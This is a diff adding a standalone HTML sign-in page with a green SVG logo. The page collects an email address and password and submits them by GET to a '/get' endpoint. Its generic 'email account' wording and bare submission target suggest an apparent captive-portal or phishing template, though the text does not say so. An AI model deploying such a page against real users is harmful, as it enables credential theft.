@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 80px;
+  height: 80px;
+  fill: #00704A;
+  margin-right: 100px
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #00704A;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #6dba46;
+  border: none;
+  color: #002e3b;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.submit-btn:hover {
+  background: #00704A;
+}
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+  <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="280.000000pt" height="280.000000pt" viewBox="0 0 280.000000 280.000000"
+ preserveAspectRatio="xMidYMid meet">
+
+<g transform="translate(0.000000,280.000000) scale(0.100000,-0.100000)"
+fill="#6dba46" stroke="none">
+<path d="M1055 1721 c-80 -22 -126 -58 -151 -116 -19 -46 -17 -91 5 -141 24
+-53 64 -80 169 -116 131 -43 165 -76 105 -99 -35 -13 -94 1 -173 41 l-59 30
+-22 -50 c-12 -27 -25 -47 -28 -45 -4 2 -42 112 -86 245 l-79 241 -120 -3 -119
+-3 -42 -125 c-24 -69 -72 -209 -108 -312 l-65 -188 93 0 93 0 15 43 14 42 113
+0 113 0 11 -40 12 -40 98 -3 98 -3 -6 27 c-6 23 -5 25 11 19 110 -46 121 -49
+208 -49 109 -1 170 24 216 87 l29 40 0 -62 0 -63 173 4 c156 3 176 6 217 27
+25 13 57 35 73 49 31 30 32 28 12 -21 -8 -20 -15 -41 -15 -47 0 -7 31 -10 92
+-8 l91 3 15 43 14 42 113 0 113 0 11 -45 11 -45 95 0 c69 0 95 3 95 12 0 7
+-45 149 -101 315 l-101 303 -117 0 -117 0 -16 -47 c-73 -216 -95 -274 -101
+-258 -4 9 -7 30 -7 45 0 59 -39 137 -92 184 -71 64 -117 76 -305 76 l-153 0 0
+-168 0 -169 -43 41 c-32 32 -64 49 -139 75 -54 18 -102 39 -109 47 -16 20 6
+44 40 44 30 0 119 -27 139 -43 9 -7 18 5 36 45 39 88 39 89 -29 117 -64 26
+-185 37 -240 22z m618 -182 c54 -15 77 -56 77 -137 0 -101 -40 -152 -120 -152
+l-40 0 0 150 c0 169 -4 163 83 139z m-1034 -101 c13 -46 26 -91 28 -100 5 -16
+-2 -18 -57 -18 -55 0 -62 2 -58 18 26 94 54 182 58 182 3 0 16 -37 29 -82z
+m1576 -8 c14 -46 25 -89 25 -97 0 -9 -17 -13 -59 -13 l-59 0 29 97 c16 53 29
+99 29 101 0 18 13 -16 35 -88z"/>
+</g>
+</svg>
+
+
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your <b>email</b> account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+      <button class="submit-btn" type="submit">Continue</button>
+
+    </form>
+
+  </div>
+
+</div>
+</body>
+</html>
